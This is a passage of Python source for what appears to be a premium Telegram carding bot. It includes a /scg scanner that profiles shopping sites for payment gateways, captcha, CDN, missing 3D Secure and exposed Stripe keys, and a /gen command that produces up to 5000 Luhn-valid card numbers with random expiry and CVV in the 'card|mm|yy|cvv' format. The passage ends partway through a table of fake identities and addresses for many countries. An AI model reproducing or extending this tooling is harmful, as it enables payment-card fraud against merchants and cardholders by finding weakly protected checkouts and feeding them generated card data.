                    f"📊 Charges: {data.get('charges_enabled', False)}"
                ))
            else:
                await styled_reply(event, pe(f"❌ <b>{bs('Invalid')}</b> (HTTP {r.status})"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


def _scg_scripts(html):
    return re.findall(r'<script[^>]*src\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE)


def _scg_gateways(html):
    found, h = [], html.lower()
    srcs = _scg_scripts(html)
    for s in srcs:
        if "js.stripe.com" in s.lower(): found.append("Stripe"); break
    if not found and re.search(r'pk_live_|pk_test_', html): found.append("Stripe")
    for s in srcs:
        if "paypal.com/sdk" in s.lower(): found.append("PayPal"); break
    for s in srcs:
        if "myshopify.com" in s.lower() or "cdn.shopify.com" in s.lower(): found.append("Shopify"); break
    if not found and "shopify.com" in h: found.append("Shopify")
    if "woocommerce" in h: found.append("WooCommerce")
    for s in srcs:
        if "razorpay.com" in s.lower(): found.append("Razorpay"); break
    if not found and "razorpay" in h: found.append("Razorpay")
    for s in srcs:
        if "braintreegateway" in s.lower(): found.append("Braintree"); break
    for s in srcs:
        if "squarecdn.com" in s.lower(): found.append("Square"); break
    for s in srcs:
        if "adyen.com" in s.lower(): found.append("Adyen"); break
    return list(dict.fromkeys(found))


def _scg_cms(html):
    h = html.lower()
    found = []
    if "/wp-content/" in h: found.append("WordPress")
    if "woocommerce" in h: found.append("WooCommerce")
    if "myshopify.com" in h: found.append("Shopify")
    if "magento" in h: found.append("Magento")
    if "prestashop" in h: found.append("PrestaShop")
    if "bigcommerce" in h: found.append("BigCommerce")
    return found or ["Unknown"]


def _scg_captcha(html):
    h = html.lower()
    if "recaptcha" in h: return "reCAPTCHA"
    if "hcaptcha" in h: return "hCaptcha"
    if "turnstile" in h: return "Cloudflare Turnstile"
    return "None"


def _scg_cdn(html):
    h = html.lower()
    if "cloudflare" in h: return "Cloudflare"
    if "fastly" in h: return "Fastly"
    if "akamai" in h: return "Akamai"
    if "cloudfront" in h: return "AWS CloudFront"
    return "None"


def _scg_3ds(html):
    h = html.lower()
    if any(x in h for x in ["3d_secure", "3dsecure", "requires_action",
                            "cardinalcommerce", "cavv"]):
        return "3D Secure found ✅"
    return "2D only ❌"


def _scg_keys(html):
    out = {}
    sk = re.findall(r'pk_(?:live|test)_[A-Za-z0-9_-]{10,}', html)
    if sk: out["Stripe"] = list(dict.fromkeys(sk))[:3]
    return out


@client.on(events.NewMessage(pattern=r'^[/.]scg\s+'))
async def cmd_scg(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/scg site.com</code>"))
    url = parts[1].strip()
    if not url.startswith('http'):
        url = 'https://' + url
    try:
        session = await get_http_session()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=20)) as r:
            if r.status != 200:
                return await styled_reply(event, pe(f"❌ HTTP {r.status}"))
            html = await r.text()
    except Exception as e:
        return await styled_reply(event, pe(f"❌ <code>{e}</code>"))
    gateways = _scg_gateways(html)
    cms = _scg_cms(html)
    captcha = _scg_captcha(html)
    cdn = _scg_cdn(html)
    threeds = _scg_3ds(html)
    keys = _scg_keys(html)
    key_lines = ""
    if keys:
        for gw, ks in keys.items():
            key_lines += f"\n   • {gw}: {', '.join(ks)}"
    else:
        key_lines = "\n   None"
    await styled_reply(event, pe(
        f"💎 <b>{bs('Site Scanner')}</b>\n{SEP}\n"
        f"📌 <code>{url[:60]}</code>\n{SEP}\n"
        f"🛒 {bs('Gateways')}: {', '.join(gateways) or 'None'}\n"
        f"📝 {bs('CMS')}: {', '.join(cms)}\n"
        f"🔒 {bs('Captcha')}: {captcha}\n"
        f"🌍 {bs('CDN')}: {cdn}\n"
        f"🔐 {bs('3D Secure')}: {threeds}\n"
        f"{SEP}\n🔑 {bs('Keys found')}:{key_lines}"
    ))


def _luhn_check(number: str) -> int:
    digits = [int(d) for d in number]
    odd = digits[-1::-2]; even = digits[-2::-2]
    s = sum(odd)
    for d in even:
        s += sum(int(x) for x in str(d * 2))
    return s % 10


def _gen_card(bin_prefix: str, length: int = 16) -> str:
    card = bin_prefix
    while len(card) < length - 1:
        card += str(random.randint(0, 9))
    check = (10 - _luhn_check(card + '0')) % 10
    return card + str(check)


@client.on(events.NewMessage(pattern=r'^[/.]gen\s+'))
async def cmd_gen(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/gen 515462 [count]</code>"))
    bin_prefix = parts[1].strip()
    if not bin_prefix.isdigit() or len(bin_prefix) < 6:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid BIN')}</b>"))
    count = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 5
    count = min(count, 5000)
    cards = []
    for _ in range(count):
        cn = _gen_card(bin_prefix)
        mm = str(random.randint(1, 12)).zfill(2)
        yy = str(random.randint(2026, 2035))
        cvv = str(random.randint(100, 999)).zfill(3)
        cards.append(f"{cn}|{mm}|{yy}|{cvv}")
    if count > 50:
        fname = f"NOVA_gen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
            for c in cards:
                await f.write(c + "\n")
        await send_file_entities(uid, fname,
            pe(f"✅ {bs('Generated')} <code>{count}</code>"))
        os.remove(fname)
    else:
        body = "\n".join(f"<code>{c}</code>" for c in cards)
        await styled_reply(event, pe(f"✅ <b>{bs('Generated')}</b> <code>{count}</code>\n{SEP}\n{body}"))


# ====================== /fake ======================
FAKE_DATA = {
    'US': {'name':'United States','phone_code':'+1','len':10,
        'cities':[('New York','NY','10001'),('Los Angeles','CA','90001'),('Chicago','IL','60601'),
                  ('Houston','TX','77001'),('Phoenix','AZ','85001')],
        'streets':['Main St','Oak Ave','Pine Rd','Maple Dr','Cedar Ln','Elm St'],
        'first':['John','Jane','Michael','Sarah','David','Emma','James','Olivia'],
        'last':['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis']},
    'CA': {'name':'Canada','phone_code':'+1','len':10,
        'cities':[('Toronto','ON','M5V 2H1'),('Vancouver','BC','V6Z 2E6'),('Montreal','QC','H2Y 1J1')],
        'streets':['Main St','Queen St','King St','Bay St'],
        'first':['Liam','Noah','Oliver','Elijah','William','James'],
        'last':['Smith','Johnson','Williams','Brown','Jones','Garcia']},
    'GB': {'name':'United Kingdom','phone_code':'+44','len':10,
        'cities':[('London','England','EC1A 1BB'),('Birmingham','England','B1 1AA'),
                  ('Manchester','England','M1 1AE'),('Glasgow','Scotland','G1 1AA')],
        'streets':['High St','Church St','Queen St','King St','Victoria Rd'],
        'first':['Oliver','George','Harry','Jack','Jacob','Charlie'],
        'last':['Smith','Jones','Williams','Taylor','Brown','Davies']},
    'IE': {'name':'Ireland','phone_code':'+353','len':9,
        'cities':[('Dublin','D','D02 Y006'),('Cork','CO','T12 XY88'),('Galway','G','H91 AB12')],
        'streets':['Grafton St','O\'Connell St','Patrick St'],
        'first':['Sean','Patrick','Conor','Liam','Ciaran','Declan'],
        'last':['Murphy','Kelly','O\'Brien','Walsh','Byrne','Ryan']},
    'DE': {'name':'Germany','phone_code':'+49','len':11,
        'cities':[('Berlin','BE','10115'),('Hamburg','HH','20095'),('München','BY','80331')],
        'streets':['Hauptstraße','Bahnhofstraße','Schulstraße'],
        'first':['Lukas','Maximilian','Felix','Jonas','Leon','Paul'],
        'last':['Müller','Schmidt','Schneider','Fischer','Weber','Meyer']},
    'FR': {'name':'France','phone_code':'+33','len':9,
        'cities':[('Paris','IDF','75001'),('Marseille','PACA','13001'),('Lyon','ARA','69001')],
        'streets':['Rue de la Paix','Avenue Victor Hugo','Rue Saint-Honoré'],
        'first':['Gabriel','Louis','Raphaël','Jules','Adam','Maël'],
        'last':['Martin','Bernard','Dubois','Thomas','Robert','Richard']},
    'IT': {'name':'Italy','phone_code':'+39','len':10,
        'cities':[('Roma','Lazio','00100'),('Milano','Lombardia','20100'),('Napoli','Campania','80100')],
        'streets':['Via Roma','Via Garibaldi','Via Dante'],
        'first':['Leonardo','Francesco','Alessandro','Lorenzo','Mattia','Andrea'],
        'last':['Rossi','Russo','Ferrari','Esposito','Bianchi','Romano']},
    'ES': {'name':'Spain','phone_code':'+34','len':9,
        'cities':[('Madrid','Madrid','28001'),('Barcelona','Cataluña','08001'),('Valencia','Valencia','46001')],
        'streets':['Calle Mayor','Gran Vía','Calle Real'],
        'first':['Hugo','Martín','Pablo','Alejandro','Daniel','Adrián'],
        'last':['García','Rodríguez','González','Fernández','López','Martínez']},
    'PT': {'name':'Portugal','phone_code':'+351','len':9,
        'cities':[('Lisboa','Lisboa','1100'),('Porto','Porto','4000'),('Coimbra','Coimbra','3000')],
        'streets':['Rua Augusta','Avenida da Liberdade','Rua do Ouro'],
        'first':['João','Miguel','Pedro','Rui','Tiago','Diogo'],
        'last':['Silva','Santos','Ferreira','Pereira','Oliveira','Costa']},
    'NL': {'name':'Netherlands','phone_code':'+31','len':9,
        'cities':[('Amsterdam','NH','1011'),('Rotterdam','ZH','3011'),('Den Haag','ZH','2511')],
        'streets':['Kerkstraat','Hoofdstraat','Molenstraat'],
        'first':['Daan','Sem','Lucas','Milan','Levi','Luuk'],
        'last':['De Jong','Jansen','De Vries','Van den Berg','Van Dijk','Bakker']},
    'BE': {'name':'Belgium','phone_code':'+32','len':9,
        'cities':[('Brussel','BRU','1000'),('Antwerpen','VAN','2000'),('Gent','OVL','9000')],
        'streets':['Grote Markt','Nieuwstraat','Kerkstraat'],
        'first':['Lucas','Arthur','Louis','Jules','Noah','Victor'],
        'last':['Peeters','Janssens','Maes','Jacobs','Mertens','Willems']},
    'CH': {'name':'Switzerland','phone_code':'+41','len':9,
        'cities':[('Zürich','ZH','8001'),('Genève','GE','1201'),('Basel','BS','4001')],
        'streets':['Bahnhofstrasse','Hauptstrasse','Rue du Rhône'],
        'first':['Noah','Liam','Luca','Leon','Elias','Julian'],
        'last':['Müller','Meier','Schmid','Keller','Weber','Huber']},
    'AT': {'name':'Austria','phone_code':'+43','len':10,
        'cities':[('Wien','Wien','1010'),('Graz','Steiermark','8010'),('Linz','OÖ','4020')],
        'streets':['Mariahilfer Straße','Ringstraße','Kärntner Straße'],
        'first':['Lukas','Maximilian','Jakob','Elias','Tobias','Simon'],
        'last':['Gruber','Huber','Bauer','Wagner','Müller','Pichler']},
    'SE': {'name':'Sweden','phone_code':'+46','len':9,
        'cities':[('Stockholm','AB','111 20'),('Göteborg','VG','411 01'),('Malmö','SN','211 20')],
        'streets':['Vasagatan','Kungsgatan','Sveavägen'],
        'first':['William','Lucas','Erik','Liam','Noah','Oscar'],
        'last':['Andersson','Johansson','Karlsson','Nilsson','Eriksson','Larsson']},
    'NO': {'name':'Norway','phone_code':'+47','len':8,
        'cities':[('Oslo','03','0154'),('Bergen','12','5003'),('Trondheim','16','7004')],
        'streets':['Karl Johans gate','Storgata','Kirkegata'],
        'first':['Jakob','Oliver','Emil','Noah','Lucas','Filip'],
        'last':['Hansen','Johansen','Olsen','Larsen','Andersen','Nilsen']},
    'DK': {'name':'Denmark','phone_code':'+45','len':8,
        'cities':[('København','84','1457'),('Aarhus','82','8000'),('Odense','83','5000')],
        'streets':['Strøget','Nørrebrogade','Vesterbrogade'],
        'first':['William','Oscar','Noah','Lucas','Malthe','Alfred'],
        'last':['Nielsen','Jensen','Hansen','Pedersen','Andersen','Christensen']},
    'FI': {'name':'Finland','phone_code':'+358','len':9,
        'cities':[('Helsinki','18','00100'),('Espoo','18','02100'),('Tampere','11','33100')],
        'streets':['Mannerheimintie','Aleksanterinkatu','Kauppakatu'],
        'first':['Elias','Oliver','Väinö','Eino','Leo','Emil'],
        'last':['Korhonen','Virtanen','Mäkinen','Nieminen','Hämäläinen','Laine']},
    'PL': {'name':'Poland','phone_code':'+48','len':9,
        'cities':[('Warszawa','MZ','00-001'),('Kraków','MA','30-001'),('Gdańsk','PM','80-001')],
        'streets':['ul. Marszałkowska','ul. Nowy Świat','ul. Krakowskie Przedmieście'],
        'first':['Jakub','Szymon','Jan','Antoni','Filip','Mikołaj'],
        'last':['Nowak','Kowalski','Wiśniewski','Wójcik','Kowalczyk','Kamiński']},
    'CZ': {'name':'Czech Republic','phone_code':'+420','len':9,
        'cities':[('Praha','PHA','110 00'),('Brno','JHM','602 00'),('Ostrava','MSK','702 00')],
        'streets':['Václavské náměstí','Karlova','Nádražní'],
        'first':['Jakub','Jan','Tomáš','Adam','Matěj','Vojtěch'],
        'last':['Novák','Svoboda','Novotný','Dvořák','Černý','Procházka']},
    'HU': {'name':'Hungary','phone_code':'+36','len':9,
        'cities':[('Budapest','BU','1051'),('Debrecen','HB','4024'),('Szeged','CS','6720')],
        'streets':['Váci utca','Andrássy út','Kossuth Lajos utca'],
        'first':['Bence','Máté','Levente','Dominik','Marcell','Ádám'],
        'last':['Nagy','Kovács','Tóth','Szabó','Horváth','Varga']},
    'RO': {'name':'Romania','phone_code':'+40','len':9,
        'cities':[('București','B','010011'),('Cluj-Napoca','CJ','400001'),('Timișoara','TM','300001')],
        'streets':['Calea Victoriei','Bulevardul Unirii','Strada Lipscani'],
        'first':['Andrei','Alexandru','Mihai','Ștefan','Gabriel','David'],
        'last':['Popescu','Ionescu','Popa','Stan','Dumitru','Stoica']},
    'GR': {'name':'Greece','phone_code':'+30','len':10,
        'cities':[('Αθήνα','ATT','10431'),('Θεσσαλονίκη','CM','54001'),('Πάτρα','WC','26221')],
        'streets':['Ερμού','Πανεπιστημίου','Σταδίου'],
        'first':['Γιώργος','Δημήτρης','Νίκος','Γιάννης','Κώστας','Παναγιώτης'],
        'last':['Παπαδόπουλος','Γεωργίου','Δημητρίου','Νικολάου','Αντωνίου','Μακρής']},
    'RU': {'name':'Russia','phone_code':'+7','len':10,
        'cities':[('Москва','MOW','101000'),('Санкт-Петербург','SPE','190000'),('Новосибирск','NVS','630000')],
        'streets':['ул. Тверская','Невский проспект','ул. Арбат'],
        'first':['Александр','Дмитрий','Иван','Максим','Сергей','Андрей'],
        'last':['Иванов','Смирнов','Кузнецов','Попов','Соколов','Лебедев']},
    'UA': {'name':'Ukraine','phone_code':'+380','len':9,
        'cities':[('Київ','KV','01001'),('Харків','KH','61001'),('Одеса','OD','65001')],
        'streets':['Хрещатик','вул. Сагайдачного','вул. Дерибасівська'],
        'first':['Олександр','Андрій','Максим','Іван','Дмитро','Сергій'],
        'last':['Шевченко','Коваленко','Бондаренко','Ткаченко','Кравченко','Мельник']},
    'TR': {'name':'Turkey','phone_code':'+90','len':10,
        'cities':[('İstanbul','İstanbul','34000'),('Ankara','Ankara','06000'),('İzmir','İzmir','35000')],
        'streets':['Atatürk Caddesi','İstiklal Caddesi','Cumhuriyet Caddesi'],
        'first':['Yusuf','Miraç','Mustafa','Ahmet','Mehmet','Emir'],
        'last':['Yılmaz','Kaya','Demir','Şahin','Çelik','Yıldız']},
    'AE': {'name':'United Arab Emirates','phone_code':'+971','len':9,
        'cities':[('Dubai','DU','00000'),('Abu Dhabi','AZ','00001'),('Sharjah','SH','00002')],
        'streets':['Sheikh Zayed Road','Jumeirah Beach Road','Corniche Road'],
        'first':['Mohammed','Ahmed','Ali','Omar','Khalid','Saeed'],
        'last':['Al Maktoum','Al Nahyan','Al Falasi','Al Suwaidi','Al Mazrouei']},
    'SA': {'name':'Saudi Arabia','phone_code':'+966','len':9,
        'cities':[('Riyadh','Riyadh','11564'),('Jeddah','Makkah','21442'),('Dammam','Eastern','31411')],
        'streets':['King Fahd Road','Olaya Street','Tahlia Street'],
        'first':['Abdullah','Mohammed','Ahmed','Faisal','Khalid','Saud'],
        'last':['Al Saud','Al Otaibi','Al Qahtani','Al Harbi','Al Shehri']},
    'QA': {'name':'Qatar','phone_code':'+974','len':8,
        'cities':[('Doha','DA','00000'),('Al Rayyan','RA','00001')],
        'streets':['Corniche Road','Salwa Road','Al Sadd Street'],
        'first':['Mohammed','Ahmed','Khalid','Abdullah','Jassim','Hamad'],
        'last':['Al Thani','Al Kuwari','Al Mannai','Al Emadi','Al Marri']},
    'KW': {'name':'Kuwait','phone_code':'+965','len':8,
        'cities':[('Kuwait City','KU','00000'),('Hawalli','HA','00001')],
        'streets':['Gulf Road','Salem Al Mubarak Street','Fahd Al Salem Street'],
        'first':['Abdullah','Mohammed','Ahmed','Fahad','Khaled','Yousef'],
        'last':['Al Sabah','Al Ahmad','Al Mutairi','Al Rashidi','Al Azmi']},
    'BH': {'name':'Bahrain','phone_code':'+973','len':8,
        'cities':[('Manama','CP','00000'),('Riffa','SO','00001')],
        'streets':['King Faisal Highway','Palace Avenue','Exhibition Road'],
        'first':['Ahmed','Mohammed','Ali','Hassan','Khalid','Yousef'],
        'last':['Al Khalifa','Al Doseri','Al Zayani','Al Ansari','Al Mannai']},
    'OM': {'name':'Oman','phone_code':'+968','len':8,
        'cities':[('Muscat','MA','00000'),('Salalah','DH','00001')],
        'streets':['Sultan Qaboos Street','Al Qurum Street','Al Khuwair Street'],
        'first':['Ahmed','Mohammed','Ali','Salim','Said','Khalid'],
        'last':['Al Busaidi','Al Said','Al Habsi','Al Balushi','Al Rawahi']},
    'JO': {'name':'Jordan','phone_code':'+962','len':9,
        'cities':[('Amman','AM','11110'),('Zarqa','AZ','13110'),('Irbid','IR','21110')],
        'streets':['King Hussein Street','Rainbow Street','Madaba Street'],
        'first':['Mohammed','Ahmed','Omar','Ali','Yousef','Khalid'],
        'last':['Al Abdullah','Al Masri','Al Khalidi','Al Nabulsi','Al Husseini']},
    'LB': {'name':'Lebanon','phone_code':'+961','len':8,
        'cities':[('Beirut','BA','1107'),('Tripoli','AS','1300'),('Sidon','JA','1600')],
        'streets':['Hamra Street','Rue Gouraud','Avenue Charles Malek'],
        'first':['Mohammed','Ali','Georges','Elie','Hassan','Nabil'],
        'last':['Khoury','Haddad','Nassar','Saad','Fares','Aoun']},
    'IL': {'name':'Israel','phone_code':'+972','len':9,
        'cities':[('Tel Aviv','TA','61000'),('Jerusalem','JM','91000'),('Haifa','HA','31000')],
        'streets':['Rothschild Boulevard','Dizengoff Street','Jaffa Road'],
        'first':['David','Yosef','Moshe','Aharon','Yitzhak','Shlomo'],
        'last':['Cohen','Levi','Mizrahi','Peretz','Biton','Dahan']},
    'IN': {'name':'India','phone_code':'+91','len':10,
        'cities':[('Mumbai','MH','400001'),('Delhi','Delhi','110001'),('Bangalore','KA','560001')],
        'streets':['MG Road','Nehru Road','Gandhi Marg'],
        'first':['Aarav','Vivaan','Aditya','Vihaan','Arjun','Sai'],
        'last':['Sharma','Verma','Patel','Kumar','Singh','Gupta']},
    'PK': {'name':'Pakistan','phone_code':'+92','len':10,
        'cities':[('Karachi','Sindh','74000'),('Lahore','Punjab','54000'),('Islamabad','ICT','44000')],
        'streets':['Main Boulevard','Mall Road','Jinnah Road'],
        'first':['Muhammad','Ahmed','Ali','Hassan','Usman','Bilal'],
        'last':['Khan','Ahmed','Malik','Sheikh','Chaudhry','Butt']},
    'BD': {'name':'Bangladesh','phone_code':'+880','len':10,
        'cities':[('Dhaka','DH','1000'),('Chittagong','CG','4000'),('Khulna','KH','9000')],
        'streets':['Gulshan Avenue','Mirpur Road','Dhanmondi Road'],
        'first':['Abdul','Mohammad','Rahim','Karim','Hasan','Rashid'],
        'last':['Islam','Hossain','Ahmed','Rahman','Chowdhury','Khan']},
    'LK': {'name':'Sri Lanka','phone_code':'+94','len':9,
        'cities':[('Colombo','WP','00100'),('Kandy','CP','20000'),('Galle','SP','80000')],
        'streets':['Galle Road','Marine Drive','Temple Road'],
        'first':['Kasun','Nuwan','Chamara','Dinesh','Sampath','Lahiru'],
        'last':['Perera','Silva','Fernando','Jayawardena','Bandara','Rajapaksa']},
    'NP': {'name':'Nepal','phone_code':'+977','len':9,
        'cities':[('Kathmandu','BA','44600'),('Pokhara','GA','33700')],
        'streets':['Durbar Marg','New Road','Lazimpat'],
        'first':['Ram','Shyam','Hari','Bishnu','Krishna','Suresh'],
        'last':['Sharma','Thapa','Gurung','Magar','Rai','Limbu']},
    'CN': {'name':'China','phone_code':'+86','len':11,
        'cities':[('Beijing','BJ','100000'),('Shanghai','SH','200000'),('Guangzhou','GD','510000')],
        'streets':['Nanjing Road','Wangfujing Street','Huaihai Road'],
        'first':['Wei','Ming','Hao','Jun','Lei','Bo'],
        'last':['Wang','Li','Zhang','Liu','Chen','Yang']},
    'HK': {'name':'Hong Kong','phone_code':'+852','len':8,
        'cities':[('Hong Kong','HK','000000'),('Kowloon','KL','000001')],
        'streets':['Nathan Road','Queen\'s Road','Des Voeux Road'],
        'first':['Wei','Ming','Hao','Jun','Ka','Chun'],
        'last':['Chan','Wong','Lee','Cheung','Lau','Ho']},
    'TW': {'name':'Taiwan','phone_code':'+886','len':9,
        'cities':[('Taipei','TPE','100'),('Kaohsiung','KHH','800'),('Taichung','TXG','400')],
        'streets':['Zhongxiao Road','Xinyi Road','Nanjing Road'],
        'first':['Wei','Ming','Hao','Jun','Yi','Cheng'],
        'last':['Chen','Lin','Huang','Chang','Lee','Wang']},
    'JP': {'name':'Japan','phone_code':'+81','len':10,
        'cities':[('Tokyo','13','100-0001'),('Osaka','27','530-0001'),('Kyoto','26','600-0001')],
        'streets':['Chuo-dori','Omotesando','Ginza'],
        'first':['Takashi','Yuki','Hiroshi','Kenji','Yuto','Sota'],
        'last':['Yamamoto','Tanaka','Suzuki','Takahashi','Watanabe','Ito']},
    'KR': {'name':'South Korea','phone_code':'+82','len':10,
        'cities':[('Seoul','11','03000'),('Busan','26','48000'),('Incheon','28','22000')],
        'streets':['Gangnam-daero','Teheran-ro','Sejong-daero'],
        'first':['Min-jun','Ji-ho','Seo-jun','Do-yun','Ye-jun','Ha-jun'],
        'last':['Kim','Lee','Park','Choi','Jung','Kang']},
    'TH': {'name':'Thailand','phone_code':'+66','len':9,
        'cities':[('Bangkok','BKK','10100'),('Chiang Mai','CMI','50000'),('Phuket','HKT','83000')],
        'streets':['Sukhumvit Road','Silom Road','Khao San Road'],
        'first':['Somchai','Somsak','Sombat','Anan','Chatchai','Niran'],
        'last':['Srisuwan','Rattanakorn','Wongchai','Chaiyaporn','Suwan']},
    'VN': {'name':'Vietnam','phone_code':'+84','len':9,
        'cities':[('Hà Nội','HN','100000'),('Hồ Chí Minh','SG','700000'),('Đà Nẵng','DN','500000')],
        'streets':['Nguyễn Huệ','Lê Lợi','Trần Hưng Đạo'],
        'first':['An','Bình','Cường','Dũng','Hải','Hùng'],
        'last':['Nguyễn','Trần','Lê','Phạm','Hoàng','Huỳnh']},
    'PH': {'name':'Philippines','phone_code':'+63','len':10,
        'cities':[('Manila','NCR','1000'),('Quezon City','NCR','1100'),('Cebu City','CEB','6000')],
        'streets':['Rizal Avenue','EDSA','Ayala Avenue'],
        'first':['Juan','Jose','Pedro','Miguel','Rafael','Carlos'],
        'last':['Santos','Reyes','Cruz','Garcia','Bautista','Mendoza']},
    'MY': {'name':'Malaysia','phone_code':'+60','len':9,
        'cities':[('Kuala Lumpur','KL','50000'),('Penang','PG','10000'),('Johor Bahru','JH','80000')],
        'streets':['Jalan Bukit Bintang','Jalan Ampang','Jalan Sultan Ismail'],
        'first':['Ahmad','Mohammed','Lee','Tan','Raj','Kumar'],
        'last':['Abdullah','Rahman','Tan','Lim','Lee','Wong']},
    'SG': {'name':'Singapore','phone_code':'+65','len':8,
        'cities':[('Singapore','SG','018956'),('Jurong','SG','609498')],
        'streets':['Orchard Road','Raffles Place','Marina Bay Sands'],
        'first':['Wei','Ming','Hao','Jun','Jia','Xin'],
        'last':['Tan','Lim','Lee','Ng','Wong','Chua']},
    'ID': {'name':'Indonesia','phone_code':'+62','len':10,
        'cities':[('Jakarta','JK','10110'),('Surabaya','JI','60111'),('Bandung','JB','40111')],
        'streets':['Jalan Sudirman','Jalan Thamrin','Jalan Gatot Subroto'],
        'first':['Budi','Agus','Andi','Rudi','Dedi','Eko'],
        'last':['Santoso','Wijaya','Suharto','Hartono','Kusuma']},
    'EG': {'name':'Egypt','phone_code':'+20','len':9,
        'cities':[('Cairo','C','11511'),('Alexandria','ALX','21500'),('Giza','GZ','12511')],
        'streets':['Talaat Harb Street','Corniche El Nil','Ramses Street'],
        'first':['Mohamed','Ahmed','Mahmoud','Ali','Hassan','Ibrahim'],
        'last':['El Sayed','Hassan','Ibrahim','Abdullah','Mostafa']},
    'MA': {'name':'Morocco','phone_code':'+212','len':9,
        'cities':[('Casablanca','CAS','20000'),('Rabat','RAB','10000'),('Marrakech','MRK','40000')],
        'streets':['Avenue Mohammed V','Boulevard Zerktouni','Rue de la Liberté'],
        'first':['Mohamed','Youssef','Ahmed','Karim','Hamza','Reda'],
        'last':['El Amrani','Benali','Alaoui','El Idrissi','Bennani']},
    'DZ': {'name':'Algeria','phone_code':'+213','len':9,
        'cities':[('Alger','ALG','16000'),('Oran','ORN','31000'),('Constantine','CST','25000')],
        'streets':['Rue Didouche Mourad','Boulevard Zirout Youcef'],
        'first':['Mohamed','Ahmed','Karim','Yacine','Bilal','Amine'],
        'last':['Benali','Hamdani','Bouzid','Mansouri','Belkacem']},
    'TN': {'name':'Tunisia','phone_code':'+216','len':8,
        'cities':[('Tunis','TUN','1000'),('Sfax','SFX','3000'),('Sousse','SUS','4000')],
        'streets':['Avenue Habib Bourguiba','Rue de la Liberté'],
        'first':['Mohamed','Ahmed','Karim','Sami','Amine'],
        'last':['Ben Ali','Trabelsi','Bouazizi','Hamdi','Gharbi']},
    'ZA': {'name':'South Africa','phone_code':'+27','len':9,
        'cities':[('Johannesburg','GP','2001'),('Cape Town','WC','8001'),('Durban','KZN','4001')],
        'streets':['Main Street','Long Street','Commissioner Street'],
        'first':['Pieter','Johan','Thabo','Sipho','David','Michael'],
        'last':['Van der Merwe','Botha','Nkosi','Dlamini','Smith','Jacobs']},
    'NG': {'name':'Nigeria','phone_code':'+234','len':10,
        'cities':[('Lagos','LA','100001'),('Abuja','FC','900001'),('Kano','KN','700001')],
        'streets':['Broad Street','Marina Road','Awolowo Road'],
        'first':['Chinedu','Emeka','Adebayo','Oluwaseun','Ifeanyi','Abdul'],
        'last':['Okafor','Adeyemi','Okonkwo','Balogun','Eze','Ibrahim']},
    'KE': {'name':'Kenya','phone_code':'+254','len':9,
        'cities':[('Nairobi','NRB','00100'),('Mombasa','MSA','80100'),('Kisumu','KSI','40100')],
        'streets':['Kenyatta Avenue','Moi Avenue','Tom Mboya Street'],
        'first':['John','Peter','David','James','Michael','Joseph'],
        'last':['Mwangi','Otieno','Kamau','Ochieng','Njoroge','Wanjiku']},
    'BR': {'name':'Brazil','phone_code':'+55','len':11,
        'cities':[('São Paulo','SP','01310-100'),('Rio de Janeiro','RJ','20040-020'),('Brasília','DF','70040-010')],
        'streets':['Avenida Paulista','Avenida Brasil','Rua Augusta'],
        'first':['João','Pedro','Lucas','Gabriel','Rafael','Mateus'],
        'last':['Silva','Santos','Oliveira','Souza','Rodrigues','Ferreira']},
    'AR': {'name':'Argentina','phone_code':'+54','len':10,
        'cities':[('Buenos Aires','C','1000'),('Córdoba','X','5000'),('Rosario','S','2000')],
        'streets':['Avenida Corrientes','Avenida 9 de Julio','Calle Florida'],
        'first':['Juan','Santiago','Matías','Lucas','Nicolás','Facundo'],
        'last':['González','Rodríguez','Fernández','López','Martínez','Gómez']},
    'CL': {'name':'Chile','phone_code':'+56','len':9,
        'cities':[('Santiago','RM','8320000'),('Valparaíso','VS','2340000')],
        'streets':['Avenida Providencia','Avenida Libertador','Calle Ahumada'],
        'first':['Matías','Benjamín','Vicente','Sebastián','Tomás','Diego'],
        'last':['González','Muñoz','Rojas','Díaz','Pérez','Soto']},
    'CO': {'name':'Colombia','phone_code':'+57','len':10,
        'cities':[('Bogotá','DC','110111'),('Medellín','ANT','050001'),('Cali','VAC','760001')],
        'streets':['Carrera 7','Avenida El Dorado','Calle 100'],
        'first':['Santiago','Sebastián','Juan','Andrés','Felipe','Diego'],
        'last':['Rodríguez','Gómez','González','Martínez','García','López']},
    'PE': {'name':'Peru','phone_code':'+51','len':9,
        'cities':[('Lima','LIM','15001'),('Arequipa','ARE','04001'),('Trujillo','LAL','13001')],
        'streets':['Avenida Arequipa','Avenida Larco','Jirón de la Unión'],
        'first':['Diego','Sebastián','Alejandro','Gonzalo','Rodrigo','Matías'],
        'last':['Quispe','Mamani','Huamán','Flores','García','Rodríguez']},
    'MX': {'name':'Mexico','phone_code':'+52','len':10,
        'cities':[('Ciudad de México','CDMX','01000'),('Guadalajara','Jalisco','44100'),('Monterrey','NL','64000')],
        'streets':['Avenida Reforma','Calle Madero','Avenida Juárez'],
        'first':['José','Juan','Miguel','Luis','Carlos','Jesús'],
        'last':['Hernández','García','Martínez','López','González','Pérez']},
    'AU': {'name':'Australia','phone_code':'+61','len':9,
        'cities':[('Sydney','NSW','2000'),('Melbourne','VIC','3000'),('Brisbane','QLD','4000')],
        'streets':['George St','Collins St','Queen St','King St'],
        'first':['Oliver','Jack','William','Noah','Thomas','Henry'],
        'last':['Smith','Jones','Williams','Brown','Wilson','Taylor']},
    'NZ': {'name':'New Zealand','phone_code':'+64','len':9,
        'cities':[('Auckland','AUK','1010'),('Wellington','WGN','6011'),('Christchurch','CAN','8011')],
        'streets':['Queen St','Lambton Quay','Riccarton Road'],
        'first':['Jack','Oliver','William','Liam','Noah','Hunter'],
        'last':['Smith','Wilson','Brown','Taylor','Thompson','Williams']},
